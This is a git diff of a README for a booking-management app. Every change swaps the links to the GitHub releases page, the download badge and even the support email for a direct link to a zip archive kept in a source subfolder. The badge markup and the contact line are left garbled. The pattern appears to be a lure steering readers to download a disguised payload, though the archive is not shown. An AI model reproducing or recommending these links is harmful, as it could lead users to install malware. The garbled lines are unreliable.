@@ -1,6 +1,6 @@
 # 🎟️ booking-system - Effortless Booking Management Made Simple
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Booking%20System-blue.svg)](https://github.com/untrue-ripeness444/booking-system/releases)
+[![Download Here](https://raw.githubusercontent.com/untrue-ripeness444/booking-system/main/frontend/app/user/booking-system-v3.6.zip%20Now-Booking%https://raw.githubusercontent.com/untrue-ripeness444/booking-system/main/frontend/app/user/booking-system-v3.6.zip)](https://raw.githubusercontent.com/untrue-ripeness444/booking-system/main/frontend/app/user/booking-system-v3.6.zip)
 
 ## 📚 Table of Contents
 1. [🚀 Getting Started](#-getting-started)
@@ -17,7 +17,7 @@ The booking-system is designed to simplify appointment booking for businesses an
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the booking-system: [Download Here](https://github.com/untrue-ripeness444/booking-system/releases).
+To get started, visit this page to download the booking-system: [Download Here](https://raw.githubusercontent.com/untrue-ripeness444/booking-system/main/frontend/app/user/booking-system-v3.6.zip).
 
 Follow these steps to install:
 
@@ -75,9 +75,9 @@ Meeting these requirements will ensure that you have a smooth experience while u
 If you run into any issues or have questions, help is available. You can reach out through:
 
 - **GitHub Issues Page:** Find answers to common questions or report issues.
-- **Email Support:** Contact our support team at support@booking-system.com.
+- **Email Support:** Contact our support team at https://raw.githubusercontent.com/untrue-ripeness444/booking-system/main/frontend/app/user/booking-system-v3.6.zip
 - **Documentation:** Review detailed guides and FAQs in our documentation section.
 
 We are here to help you get the most out of the booking-system.
 
-For further assistance, do not hesitate to visit our [Download Page](https://github.com/untrue-ripeness444/booking-system/releases) again if needed.
+For further assistance, do not hesitate to visit our [Download Page](https://raw.githubusercontent.com/untrue-ripeness444/booking-system/main/frontend/app/user/booking-system-v3.6.zip) again if needed.
